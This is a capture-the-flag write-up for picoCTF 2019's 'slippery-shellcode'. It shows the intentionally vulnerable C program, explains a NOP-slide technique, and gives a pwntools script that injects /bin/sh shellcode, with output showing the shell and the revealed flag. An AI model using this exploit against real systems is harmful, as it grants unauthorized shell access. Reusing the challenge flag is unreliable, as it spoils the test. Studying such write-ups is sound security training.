# slippery-shellcode
Binary Exploitation, 200 points

## Description:
> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```


## Solution:

This challenge is similar to last year's [shellcode](/2018_picoCTF/shellcode.md). The difference is that last year the program jumped to the start of the buffer, and this year it jumps to a random location within the first 256 bytes of the buffer. So, to overcome this, we prepend a *nop slide* to our shellcode. 

In other words, our payload will look like:

```
nop;nop;nop;...;nop;shellcode;
```

It doesn't matter where we fall within the nop-slide, we will execute `nop`s until we get to the shellcode.

The script:

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/slippery-shellcode_1_56175d41b0400eb642e2d2f0658b0506/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

shellcode = asm(shellcraft.sh())
io.recvuntil("Enter your shellcode:")
payload = fit({256: shellcode}, filler = asm(shellcraft.nop()))
io.sendline(payload)

io.interactive()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/slippery-shellcode# python exploit.py
[*] '/media/sf_CTFs/pico/slippery-shellcode/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.YEGLF5P9Cq'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/slippery-shellcode_1_56175d41b0400eb642e2d2f0658b0506'
[+] Starting remote process '/problems/slippery-shellcode_1_56175d41b0400eb642e2d2f0658b0506/vuln' on 2019shell1.picoctf.com: pid 1968939
[*] Switching to interactive mode

\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89h\x814$ri1Qj\x04YQ1j\x0bX?
Thanks! Executing from a random location now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{sl1pp3ry_sh311c0d3_3898c0fe}
```